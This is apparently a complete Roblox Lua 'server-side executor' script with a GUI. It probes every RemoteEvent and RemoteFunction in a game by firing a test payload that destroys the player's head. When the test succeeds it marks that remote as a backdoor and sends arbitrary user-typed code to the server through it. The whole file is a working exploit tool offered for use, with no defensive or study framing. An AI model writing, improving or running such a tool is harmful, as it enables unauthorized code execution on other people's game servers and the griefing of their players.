local TweenService = game:GetService("TweenService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local StarterGui = game:GetService("StarterGui")
local RunService = game:GetService("RunService")

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Parent = game.CoreGui
ScreenGui.Name = "z000rzkiddSSExecutor"
ScreenGui.ResetOnSpawn = false

local ScanFrame = Instance.new("Frame")
ScanFrame.Parent = ScreenGui
ScanFrame.BackgroundTransparency = 1
ScanFrame.Position = UDim2.new(0.05, 0, 0.85, -30)
ScanFrame.Size = UDim2.new(0, 120, 0, 60)
ScanFrame.Active = true
ScanFrame.Draggable = true

local ScanButton = Instance.new("TextButton")
ScanButton.Parent = ScanFrame
ScanButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
ScanButton.BorderColor3 = Color3.fromRGB(255, 255, 0)
ScanButton.BorderSizePixel = 3
ScanButton.Position = UDim2.new(0, 0, 0, 0)
ScanButton.Size = UDim2.new(1, 0, 1, 0)
ScanButton.Font = Enum.Font.SourceSansBold
ScanButton.Text = "Scan"
ScanButton.TextColor3 = Color3.fromRGB(255, 255, 0)
ScanButton.TextSize = 24

local ExecutorFrame = Instance.new("Frame")
ExecutorFrame.Parent = ScreenGui
ExecutorFrame.BackgroundTransparency = 1
ExecutorFrame.Position = UDim2.new(0.05, 0, 0.1, 0)
ExecutorFrame.Size = UDim2.new(0, 400, 0, 300)
ExecutorFrame.Visible = false
ExecutorFrame.Active = true
ExecutorFrame.Draggable = true

local BackgroundImage = Instance.new("ImageLabel")
BackgroundImage.Parent = ExecutorFrame
BackgroundImage.BackgroundTransparency = 1
BackgroundImage.Position = UDim2.new(0, 0, 0, 0)
BackgroundImage.Size = UDim2.new(1, 0, 1, 0)
BackgroundImage.ZIndex = 1
BackgroundImage.Image = "rbxassetid://106933259953201"
BackgroundImage.ScaleType = Enum.ScaleType.Crop

local TitleLabel = Instance.new("TextLabel")
TitleLabel.Parent = ExecutorFrame
TitleLabel.BackgroundTransparency = 1
TitleLabel.Position = UDim2.new(0, 10, 0, 10)
TitleLabel.Size = UDim2.new(1, -20, 0, 30)
TitleLabel.ZIndex = 3
TitleLabel.Font = Enum.Font.GothamBold
TitleLabel.Text = "z000rzkidd SS executor"
TitleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TitleLabel.TextScaled = true
TitleLabel.TextStrokeTransparency = 0
TitleLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)

local StatusLabel = Instance.new("TextLabel")
StatusLabel.Parent = ExecutorFrame
StatusLabel.BackgroundTransparency = 1
StatusLabel.Position = UDim2.new(0, 20, 0, 45)
StatusLabel.Size = UDim2.new(1, -40, 0, 20)
StatusLabel.ZIndex = 4
StatusLabel.Font = Enum.Font.SourceSans
StatusLabel.Text = "Scanning..."
StatusLabel.TextColor3 = Color3.fromRGB(255, 255, 0)
StatusLabel.TextSize = 16
StatusLabel.TextXAlignment = Enum.TextXAlignment.Left

local CommandTextBox = Instance.new("TextBox")
CommandTextBox.Parent = ExecutorFrame
CommandTextBox.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
CommandTextBox.BorderColor3 = Color3.fromRGB(255, 255, 0)
CommandTextBox.BorderSizePixel = 3
CommandTextBox.Position = UDim2.new(0, 20, 0, 70)
CommandTextBox.Size = UDim2.new(1, -40, 0, 130)
CommandTextBox.ZIndex = 4
CommandTextBox.Font = Enum.Font.SourceSans
CommandTextBox.PlaceholderColor3 = Color3.fromRGB(255, 255, 0)
CommandTextBox.PlaceholderText = "Write Require Script Here"
CommandTextBox.Text = ""
CommandTextBox.TextColor3 = Color3.fromRGB(255, 255, 0)
CommandTextBox.TextSize = 18
CommandTextBox.TextXAlignment = Enum.TextXAlignment.Left
CommandTextBox.TextYAlignment = Enum.TextYAlignment.Top
CommandTextBox.ClearTextOnFocus = false
CommandTextBox.MultiLine = true

local ExecuteButton = Instance.new("TextButton")
ExecuteButton.Parent = ExecutorFrame
ExecuteButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
ExecuteButton.BorderColor3 = Color3.fromRGB(255, 255, 0)
ExecuteButton.BorderSizePixel = 3
ExecuteButton.Position = UDim2.new(0.05, 0, 1, -55)
ExecuteButton.Size = UDim2.new(0.42, 0, 0, 45)
ExecuteButton.ZIndex = 5
ExecuteButton.Font = Enum.Font.SourceSans
ExecuteButton.Text = "Execute"
ExecuteButton.TextColor3 = Color3.fromRGB(255, 255, 0)
ExecuteButton.TextSize = 25

local ClearButton = Instance.new("TextButton")
ClearButton.Parent = ExecutorFrame
ClearButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
ClearButton.BorderColor3 = Color3.fromRGB(255, 255, 0)
ClearButton.BorderSizePixel = 3
ClearButton.Position = UDim2.new(0.53, 0, 1, -55)
ClearButton.Size = UDim2.new(0.42, 0, 0, 45)
ClearButton.ZIndex = 5
ClearButton.Font = Enum.Font.SourceSans
ClearButton.Text = "Clear"
ClearButton.TextColor3 = Color3.fromRGB(255, 255, 0)
ClearButton.TextSize = 25

local currentBackdoor = nil

local function respawnWait()
    if LocalPlayer.Character then
        local hum = LocalPlayer.Character:FindFirstChild("Humanoid")
        if hum then hum.Died:Wait() end
    end
    LocalPlayer.CharacterAdded:Wait()
    wait(1)
end

local function testRemote(remote)
    local testCode = string.format('game.Players["%s"].Character.Head:Destroy()', LocalPlayer.Name)
    local success = pcall(function()
        if remote:IsA("RemoteEvent") then
            remote:FireServer(testCode)
        elseif remote:IsA("RemoteFunction") then
            remote:InvokeServer(testCode)
        end
    end)
    if success then
        local start = tick()
        while tick() - start < 2 do
            RunService.Heartbeat:Wait()
            if not LocalPlayer.Character or not LocalPlayer.Character:FindFirstChild("Head") then
                task.spawn(respawnWait)
                return true
            end
        end
    end
    return false
end

local function scanBackdoors()
    ScanButton.Text = "Scanning..."
    ScanButton.Active = false
    StatusLabel.Text = "Scanning... (may kill 1-2 times)"

    currentBackdoor = nil

    local targets = {game:GetService("ReplicatedStorage"), game.Workspace}
    local tested = 0
    local limit = 300

    for _, target in pairs(targets) do
        for _, obj in pairs(target:GetDescendants()) do
            if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
                tested = tested + 1
                StatusLabel.Text = "Checking #" .. tested

                if testRemote(obj) then
                    currentBackdoor = obj
                    StatusLabel.Text = "Backdoor found: " .. obj:GetFullName()
                    StarterGui:SetCore("SendNotification", {
                        Title = "Success",
                        Text = "Backdoor found!",
                        Duration = 5
                    })
                    break
                end
            end
        end
        if currentBackdoor then break end
    end

    ScanButton.Text = "Scan"
    ScanButton.Active = true

    if currentBackdoor then
        local expand = TweenService:Create(ScanFrame, TweenInfo.new(0.6, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
            Size = UDim2.new(0, 400, 0, 300),
            Position = UDim2.new(0.05, 0, 0.1, 0)
        })
        expand:Play()

        expand.Completed:Connect(function()
            ScanFrame.Visible = false
            ExecutorFrame.Visible = true
            ExecutorFrame.Position = ScanFrame.Position
        end)
    else
        StatusLabel.Text = "No backdoor found"
        StarterGui:SetCore("SendNotification", {
            Title = "Result",
            Text = "No backdoor detected",
            Duration = 4
        })
    end
end

local function executeCommand()
    if not currentBackdoor then return end

    local cmd = CommandTextBox.Text
    if cmd == "" then return end

    pcall(function()
        if currentBackdoor:IsA("RemoteEvent") then
            currentBackdoor:FireServer(cmd)
        elseif currentBackdoor:IsA("RemoteFunction") then
            currentBackdoor:InvokeServer(cmd)
        end
    end)

    StarterGui:SetCore("SendNotification", {
        Title = "Executed",
        Text = cmd,
        Duration = 3
    })
end

local function clearText()
    CommandTextBox.Text = ""
end

ScanButton.MouseButton1Click:Connect(scanBackdoors)
ExecuteButton.MouseButton1Click:Connect(executeCommand)
ClearButton.MouseButton1Click:Connect(clearText)

CommandTextBox.FocusLost:Connect(function(enterPressed)
    if enterPressed then
        executeCommand()
    end
end)